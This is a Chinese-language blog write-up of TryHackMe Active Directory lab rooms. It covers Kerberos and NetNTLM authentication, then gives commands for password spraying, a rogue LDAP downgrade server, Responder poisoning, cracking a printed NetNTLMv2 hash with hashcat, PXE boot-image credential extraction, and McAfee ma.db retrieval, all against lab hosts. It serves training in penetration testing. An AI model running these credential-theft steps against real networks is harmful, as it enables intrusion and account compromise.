<h2 id="认证方式"><a href="#认证方式" class="headerlink" title="认证方式"></a>认证方式</h2><p>使用 Windows 域时，所有凭据都存储在域控制器中。每当用户尝试使用域凭据对服务进行身份验证时，服务都需要请求域控制器验证凭据是否正确。在 Windows 域中，有两种协议可用于网络身份验证：</p>
<ul>
<li>Kerberos 协议： 任何最新版本的 Windows 都会使用。这是任何新版域的默认协议。</li>
<li>NetNTLM：出于兼容性目的而保留的传统身份验证协议。</li>
</ul>
<p>虽然 NetNTLM 应被视为过时协议，但大多数网络都会启用这两种协议。让我们深入了解一下这两种协议的工作原理。</p>
<h3 id="Kerberos-Authentication"><a href="#Kerberos-Authentication" class="headerlink" title="Kerberos Authentication"></a>Kerberos Authentication</h3><ol>
<li>用户携带用户名和用户自己的 Hash 加密过的时间戳向 KDC 请求 TGT</li>
<li>KDC 回复一个 TGT，里面有一份 Session Key，不过是用 krbtgt 账户 Hash 加密过的。和一个使用用户 Hash 加密的 Session Key 返回给用户</li>
<li>当用户想请求网络上的一个服务时，会向 KDC 请求一个 TGS。发送过去的东西有<ol>
<li>用 Session Key 加密过的用户名和时间戳</li>
<li>上一步 KDC 返回回来的 TGT</li>
<li>SPN（服务主体名称）</li>
</ol>
</li>
<li>然后 KDC 回复一个用服务所有者账户 Hash 加密的 TGS，这个 TGS 里面有 Svc Session Key。和一个用 Session Key 加密的 Svc Session Key。</li>
<li>当用户请求一个服务时，会发送用 Svc Session Key 加密过的用户名和时间戳。还有包含 Svc Session Key 的 TGS。<ul>
<li>TGS 里面是有 Svc Session Key 的，然后服务器可以用它的 Hash 去解密 TGS，拿到 Svc Session Key，就能解密用户的数据包了</li>
</ul>
</li>
</ol>
<h3 id="NetNTLM-Authentication"><a href="#NetNTLM-Authentication" class="headerlink" title="NetNTLM Authentication"></a>NetNTLM Authentication</h3><p>NetNTLM 采用挑战-响应机制工作。整个过程如下：</p>
<img src="/thm_ad/2eab5cacbd0d3e9dc9afb86169b711ec.png" class="" title="NetNTLM authentication">

<ol>
<li>客户端向想要访问的服务器发送验证请求。</li>
<li>服务器会生成一个随机数，并将其作为挑战发送给客户端。</li>
<li>客户端将其 NTLM 密码哈希值与挑战（及其他已知数据）相结合，生成对挑战的响应，并将其发送回服务器进行验证。</li>
<li>服务器将挑战和响应转发给域控制器进行验证。</li>
<li>域控制器使用挑战重新计算响应，并将其与客户端发送的原始响应进行比较。如果两者匹配，则客户端通过验证；否则，拒绝访问。身份验证结果将发回服务器。</li>
<li>服务器将验证结果转发给客户端。</li>
</ol>
<p>请注意，为了安全起见，用户密码（或哈希值）绝不会通过网络传输。</p>
<p>注意：所述过程适用于使用域帐户的情况。如果使用的是本地账户，服务器可自行验证对挑战的响应，而无需与域控制器交互，因为服务器的 SAM 上本地存储有密码哈希值。</p>
<h2 id="Trees-Forests-and-Trusts"><a href="#Trees-Forests-and-Trusts" class="headerlink" title="Trees, Forests and Trusts"></a>Trees, Forests and Trusts</h2><p>随着公司的发展，其网络也在不断发展。开始时，公司拥有一个域名就足够了，但随着时间的推移，一些额外的需求可能会促使你拥有多个域名。</p>
<h3 id="树-Trees"><a href="#树-Trees" class="headerlink" title="树 Trees"></a>树 Trees</h3><p>例如，设想一下，您的公司突然扩展到一个新的国家。新的国家有不同的法律法规，要求您更新 GPO 以符合规定。此外，您现在在两个国家都有 IT 人员，每个 IT 团队都需要在不干扰其他团队的情况下管理与每个国家相对应的资源。虽然您可以创建复杂的 OU 结构并使用授权来实现这一目标，但庞大的 AD 结构可能难以管理，而且容易出现人为错误。</p>
<p>幸运的是，Active Directory 支持整合多个域，这样您就可以将网络划分为可以独立管理的单元。如果您有两个共享相同名称空间的域，那么这两个域可以连接成一棵树。</p>
<p>如果我们的 thm.local 域被分为英国和美国分支的两个子域，则可以建立一个树状结构，其中包括一个根域 thm.local，以及名为 uk.thm.local 和 us.thm.local 的两个子域，每个子域都有自己的 AD、计算机和用户：</p>
<img src="/thm_ad/abea24b7979676a1dcc0c568054544c8.png" class="" title="Tree">

<p>这种分区结构可以让我们更好地控制谁可以访问域中的哪些内容。英国的 IT 人员将有自己的 DC，只管理英国的资源。例如，英国用户将无法管理美国用户。这样，每个分支机构的域管理员就可以完全控制各自的 DC，但不能控制其他分支机构的 DC。还可以为树状结构中的每个域独立配置策略。</p>
<p>在谈及树和林时，需要引入一个新的安全组。企业管理员组将授予用户对企业所有域的管理权限。每个域仍有域管理员，他们对自己的单个域拥有管理员权限，而企业管理员则可以控制企业中的一切。</p>
<h3 id="森林-Forests"><a href="#森林-Forests" class="headerlink" title="森林 Forests"></a>森林 Forests</h3><p>您管理的域也可以配置在不同的命名空间中。假设贵公司不断发展壮大，最终收购了另一家名为 MHT Inc. 两家公司合并后，每家公司可能会有不同的域树，分别由各自的 IT 部门管理。将多个具有不同命名空间的域树合并到同一网络中称为森林。</p>
<img src="/thm_ad/03448c2faf976db890118d835000bab7.png" class="" title="Forest">

<h3 id="信任关系-Trust-Relationships"><a href="#信任关系-Trust-Relationships" class="headerlink" title="信任关系 Trust Relationships"></a>信任关系 Trust Relationships</h3><p>将多个域以树和森林的形式组织起来，可以在管理和资源方面形成一个良好的分隔网络。但在某些情况下，THM UK 的用户可能需要访问 MHT ASIA 服务器中的某个共享文件。为此，以树和森林形式排列的域通过信任关系连接在一起。</p>
<p>简单地说，域之间的信任关系允许您授权域 THM UK 的用户访问域 MHT EU 的资源。</p>
<p>可以建立的最简单的信任关系是单向信任关系。在单向信任关系中，如果网域 AAA 信任网域 BBB，这就意味着可以授权 BBB 上的用户访问 AAA 上的资源：</p>
<img src="/thm_ad/af95eb1a4b6c672491d8989f79c00200.png" class="" title="Trusts">

<p>单向信任关系的方向与访问方向相反。</p>
<p>也可以建立双向信任关系，允许两个域相互授权对方的用户。默认情况下，在树或森林下连接多个域将形成双向信任关系。</p>
<p>需要注意的是，域之间建立信任关系并不会自动授予访问其他域上所有资源的权限。一旦建立了信任关系，你就有机会授权不同域的用户，但授权与否取决于你。</p>
<hr>
<h1 id="Breaching-Active-Directory"><a href="#Breaching-Active-Directory" class="headerlink" title="Breaching Active Directory"></a>Breaching Active Directory</h1><p>首先是配置网络，说实话有点麻烦，要下官方他提供的那个专门用于 AD 域的配置文件，还要把系统的 DNS 覆盖掉。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">vim</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/etc/resolv.conf</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 锁定和解锁文件</span></span>
<span class="line"><span style="color: #61AFEF">chattr</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">+i</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/etc/resolv.conf</span></span>
<span class="line"><span style="color: #61AFEF">chattr</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/etc/resolv.conf</span></span></code></pre></div></div></figure>

<p>其他的倒是没啥了，不过发现 223.5.5.5 在<del>我网络环境下面死掉了</del>。</p>
<p>并不是，是他自己死了：<a target="_blank" rel="noopener" href="https://www.v2ex.com/t/1149042">https://www.v2ex.com/t/1149042</a></p>
<h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>这一节提了一下 NTLM 和 NetNTLM 概念，后者是接收到用户凭据之后，发送到 DC 服务器去认证，认证不在这个机器上进行而是在 DC 上做的。</p>
<p>密码喷洒意思是：用一个已知的密码去尝试其他的用户登录，用这种方式能避免被发现，如果爆破的话动静很大。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">python3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ntlm_passwordspray.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-u</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">usernames.txt</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Changeme123</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://ntlmauth.za.tryhackme.com/</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># Python 用这条命令安装缺的库</span></span>
<span class="line"><span style="color: #61AFEF">pip</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">install</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">requests_ntlm</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--break-system-packages</span></span></code></pre></div></div></figure>

<h2 id="LDAP-回传攻击"><a href="#LDAP-回传攻击" class="headerlink" title="LDAP 回传攻击"></a>LDAP 回传攻击</h2><p>这一节就是通过模拟 LDAP 服务器，强制降级认证方式然后从通信上截取明文密码，我觉得这里应该有开源的轮子。</p>
<p>题目是给了一个打印机服务器，密码不是明文存储的，但是我们可以通过修改他的服务器地址去截获他。</p>
<p>然后我们要搭建一个 LDAP 服务器，这里用的是 <code>SLAPD</code>。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 安装</span></span>
<span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">apt-get</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">update</span><span style="color: #ABB2BF"> &amp;&amp; </span><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">apt-get</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-y</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">install</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">slapd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ldap-utils</span><span style="color: #ABB2BF"> &amp;&amp; </span><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">systemctl</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">enable</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">slapd</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 配置</span></span>
<span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">dpkg-reconfigure</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">low</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">slapd</span></span></code></pre></div></div></figure>

<p>然后要让认证降级成明文的，用到这样一个配置文件。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">#olcSaslSecProps.ldif</span></span>
<span class="line"><span style="color: #abb2bf">dn: cn=config</span></span>
<span class="line"><span style="color: #abb2bf">replace: olcSaslSecProps</span></span>
<span class="line"><span style="color: #abb2bf">olcSaslSecProps: noanonymous,minssf=0,passcred</span></span></code></pre></div></div></figure>

<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 应用配置文件</span></span>
<span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ldapmodify</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-Y</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">EXTERNAL</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-H</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ldapi://</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">./olcSaslSecProps.ldif</span><span style="color: #ABB2BF"> &amp;&amp; </span><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">service</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">slapd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">restart</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 测试配置文件</span></span>
<span class="line"><span style="color: #61AFEF">ldapsearch</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-H</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ldap://</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-LLL</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-s</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">base</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">supportedSASLMechanisms</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># dn:</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># supportedSASLMechanisms: PLAIN</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># supportedSASLMechanisms: LOGIN</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 抓包</span></span>
<span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">tcpdump</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-SX</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">breachad</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">port</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">389</span></span></code></pre></div></div></figure>

<h2 id="认证中继"><a href="#认证中继" class="headerlink" title="认证中继"></a>认证中继</h2><p>这一节讲述的是，在 Windows 机器的网络下面，很多服务会互相通信，允许用户使用这些网络中提供的服务。而这些服务会用身份验证方法去验证身份，这就让我们有了可乘之机，可以去抓取这些数据包去破解。</p>
<h3 id="Server-Message-Block-SMB"><a href="#Server-Message-Block-SMB" class="headerlink" title="Server Message Block (SMB)"></a>Server Message Block (SMB)</h3><p>在早期版本的 SMB 中安全性不足，有很多漏洞和利用点，尽管漏洞在新版中解决了，但是因为旧系统不支持这些版本或者其他原因，导致没有<strong>强制</strong>升级到最新版。</p>
<ul>
<li>抓 NTLM Challenge 包，离线破解，但是比直接爆破 NTLM hash 慢很多</li>
<li>可以自建服务器做 MTIM 攻击，截获认证成功的 session</li>
</ul>
<h3 id="LLMNR-NBT-NS-and-WPAD"><a href="#LLMNR-NBT-NS-and-WPAD" class="headerlink" title="LLMNR, NBT-NS, and WPAD"></a>LLMNR, NBT-NS, and WPAD</h3><p>在现实局域网上会有很多 NetNTLM challenge，有时因为过期的 DNS 记录，这些数据包可能会发到你伪造的服务器上。</p>
<p>文章介绍了一个 <a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">Responder</a> 工具，他可以去实现 MITM。</p>
<p>在真实的局域网（LAN）中，<strong>Responder</strong> 会尝试<strong>投毒</strong>它检测到的任何<strong>链路本地多播名称解析</strong>、<strong>NetBIOS 名称服务</strong> 和 <strong>Web 代理自动发现</strong>请求。</p>
<p>在大型 Windows 网络中，这些协议能让主机去自己发现主机，而不是去请求 DNS 服务器，这些协议就类似于 DNS 一样的，不过他的行为更像 ARP。主机可以首先尝试通过发送 <strong>LLMNR (Link-Local Multicast Name Resolution)</strong> 请求，并查看是否有任何主机响应，来确定它们要查找的主机是否在同一个本地网络上。 <strong>NBT-NS (NetBIOS Name Service)</strong> 是 LLMNR 的前身协议，而 <strong>WPAD (Web Proxy Auto-Discovery)</strong> 请求是为了尝试查找未来 HTTP(s) 连接的代理服务器而发出的。</p>
<p>由于这些协议依赖于在本地网络中广播的请求，所以我们的<strong>恶意设备</strong>也能收到这些请求。通常，这些请求因为不是发给我们的主机，就会被简单地丢弃。然而，<strong>Responder</strong> 会积极监听这些请求，并发送<strong>伪造的响应</strong>，告诉发起请求的主机：<strong>我们的 IP 地址就是它想要连接的主机名对应的地址</strong>。通过投毒这些请求，Responder 试图强制客户端连接到我们的 <strong>攻击机</strong>。与此同时，它还会启动并托管多个服务器，比如 <strong>SMB、HTTP、SQL</strong> 等，以便捕获这些连接请求并<strong>强制进行身份验证</strong>，然后我们能直接抓到凭据或者是 hash。</p>
<h3 id="拦截-NetNTLM"><a href="#拦截-NetNTLM" class="headerlink" title="拦截 NetNTLM"></a>拦截 NetNTLM</h3><p>因为 Responder 是通过 race condition（比服务器更快响应给客户端）去给连接投毒的，这样我们才能拦截到这个连接。</p>
<p>还要小心 Responder 会干扰到正常业务，或者被检测到。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">responder.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-I</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">breachad</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 记得关掉前面开的 SLAPD</span></span>
<span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">service</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">slapd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">stop</span></span></code></pre></div></div></figure>

<p>然后过一会就抓到 Hash 了，直接丢进 Hashcat 爆破。5600 是 NetNTLMv2，不同的 Hash 种类可以在<a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">这里</a>看。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">echo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;svcFileCopy::ZA:d1fbc574572a06d8:AC7426941099D79E45ED19E4BBEB34BC:010100000000000000AB4DF0E601DC01817050186B6BCBB900000000020008004B0049004D00560001001E00570049004E002D004C00550038004800480044005900460032003200310004003400570049004E002D004C0055003800480048004400590046003200320031002E004B0049004D0056002E004C004F00430041004C00030014004B0049004D0056002E004C004F00430041004C00050014004B0049004D0056002E004C004F00430041004C000700080000AB4DF0E601DC01060004000200000008003000300000000000000000000000002000003EA8D95F89C068EA81D77546006E5A06B91A2AA73F678D23068A0A89689CD7400A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00350030002E00310038002E0037000000000000000000&quot;</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">hash.txt</span><span style="color: #ABB2BF"> &amp;&amp; </span><span style="color: #61AFEF">hashcat</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-m</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">5600</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">hash.txt</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">./passwordlist-1647876320267.txt</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--force</span></span></code></pre></div></div></figure>

<h3 id="SMB-Relay-中继"><a href="#SMB-Relay-中继" class="headerlink" title="SMB Relay 中继"></a>SMB Relay 中继</h3><p>如果 SMB 开了签名就寄了，可以通过 SMB 中继把认证成功的截获，然后以这个用户的身份去访问那些文件。</p>
<p>推荐房间：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/hololive">https://tryhackme.com/room/hololive</a></p>
<p>看了一下，这房间覆盖面好广，之后再来探索吧。</p>
<h2 id="微软部署工具包"><a href="#微软部署工具包" class="headerlink" title="微软部署工具包"></a>微软部署工具包</h2><p>介绍了一下 Microsoft Deployment Toolkit (MDT) 和 Microsoft’s System Center Configuration Manager (SCCM)，MDT 是集成在 SCCM 里面的，这俩是自动化安装系统&#x2F;打补丁工具，但是没有说具体实现，介绍一下思路。</p>
<h3 id="从镜像文件中提取凭据"><a href="#从镜像文件中提取凭据" class="headerlink" title="从镜像文件中提取凭据"></a>从镜像文件中提取凭据</h3><p>提了一下 MDT 可以用来管理 PXE 启动，题目的意思就是我们可以拿到他的配置文件，然后找到那个安装镜像，里面会存着用于配置系统的账户和密码，BCD 文件可以用 <a target="_blank" rel="noopener" href="https://github.com/wavestone-cdt/powerpxe">PowerPXE</a> 提取里面的信息。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 取回 bcd 文件</span></span>
<span class="line"><span style="color: #61AFEF">tftp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.200</span><span style="color: #98C379">.20.202</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">GET</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\Tmp\x64{0620E466-5D23-4890-A8C2-3E89E9A4E777}.bcd&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">conf.bcd</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 进入 PowerShell 环境</span></span>
<span class="line"><span style="color: #61AFEF">powershell</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-executionpolicy</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">bypass</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 载入 PowerShell 脚本</span></span>
<span class="line"><span style="color: #61AFEF">Import-Module</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">.</span><span style="color: #56B6C2">\P</span><span style="color: #98C379">owerPXE.ps1</span></span>
<span class="line"><span style="color: #E06C75">$BCDFile</span><span style="color: #ABB2BF"> = </span><span style="color: #98C379">&quot;conf.bcd&quot;</span></span>
<span class="line"><span style="color: #61AFEF">Get-WimFile</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-bcdFile</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$BCDFile</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">&gt;&gt; Parse the BCD file: conf.bcd</span></span>
<span class="line"><span style="color: #ABB2BF">&gt;&gt;&gt;&gt; </span><span style="color: #61AFEF">Identify</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">wim</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">file</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">:</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\B</span><span style="color: #98C379">oot</span><span style="color: #56B6C2">\x</span><span style="color: #98C379">64</span><span style="color: #56B6C2">\I</span><span style="color: #98C379">mages</span><span style="color: #56B6C2">\L</span><span style="color: #98C379">iteTouchPE_x64.wim</span></span>
<span class="line"><span style="color: #61AFEF">\Boot\x64\Images\LiteTouchPE_x64.wim</span></span></code></pre></div></div></figure>

<p>这里找到了一个启动镜像文件，下载下来然后用 PowerPXE 脚本提取信息，或者可以手动解包镜像之后找到 <code>bootstrap.ini</code> 查看。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">tftp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.200</span><span style="color: #98C379">.20.202</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">GET</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\Boot\x64\Images\LiteTouchPE_x64.wim&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">pxeboot.wim</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-v</span></span>
<span class="line"><span style="color: #61AFEF">Get-FindCredentials</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-WimFile</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">pxeboot.wim</span></span>
<span class="line"><span style="color: #ABB2BF">&gt;&gt; Open pxeboot.wim</span></span>
<span class="line"><span style="color: #ABB2BF">&gt;&gt;&gt;&gt; </span><span style="color: #61AFEF">Finding</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Bootstrap.ini</span></span>
<span class="line"><span style="color: #ABB2BF">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; </span><span style="color: #61AFEF">DeployRoot</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\\</span><span style="color: #98C379">THMMDT</span><span style="color: #56B6C2">\M</span><span style="color: #98C379">TDBuildLab</span><span style="color: #ABB2BF">$</span></span>
<span class="line"><span style="color: #ABB2BF">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; </span><span style="color: #61AFEF">UserID</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> &lt;</span><span style="color: #98C379">accoun</span><span style="color: #ABB2BF">t&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; </span><span style="color: #61AFEF">UserDomain</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ZA</span></span>
<span class="line"><span style="color: #ABB2BF">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; </span><span style="color: #61AFEF">UserPassword</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> &lt;</span><span style="color: #98C379">passwor</span><span style="color: #ABB2BF">d&gt;</span></span></code></pre></div></div></figure>

<p>关于 PXE 提取信息相关可以看这个：<a target="_blank" rel="noopener" href="https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/">https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/</a></p>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>这个也是老生常谈了，也是信息收集技能的一环，文章提到了以下几个地方可能会存着凭据。</p>
<ul>
<li>Web 应用程序配置文件</li>
<li>服务配置文件</li>
<li>注册表</li>
<li>集中部署的应用程序</li>
<li><strong>浏览器</strong></li>
</ul>
<p>另外也可以用这个自动化工具 <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">Seatbelt</a> 去提取。</p>
<h2 id="从迈克菲杀毒中提取凭据"><a href="#从迈克菲杀毒中提取凭据" class="headerlink" title="从迈克菲杀毒中提取凭据"></a>从迈克菲杀毒中提取凭据</h2><p>McAfee 在安装过程中，会将用于连接回其管理服务器的<strong>凭据嵌入在一个名为 <code>ma.db</code> 的文件中</strong>。拥有本地主机访问权限后，可以检索并读取这个数据库文件，从而<strong>恢复相关的 AD 服务账户</strong>。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">cd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">C:</span><span style="color: #56B6C2">\P</span><span style="color: #98C379">rogramData</span><span style="color: #56B6C2">\M</span><span style="color: #98C379">cAfee</span><span style="color: #56B6C2">\A</span><span style="color: #98C379">gent</span><span style="color: #56B6C2">\D</span><span style="color: #98C379">B</span></span>
<span class="line"><span style="color: #61AFEF">dir</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 通过 SCP 把文件传到本地</span></span>
<span class="line"><span style="color: #61AFEF">scp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">.</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 打开迈克菲的 SQLite 数据库</span></span>
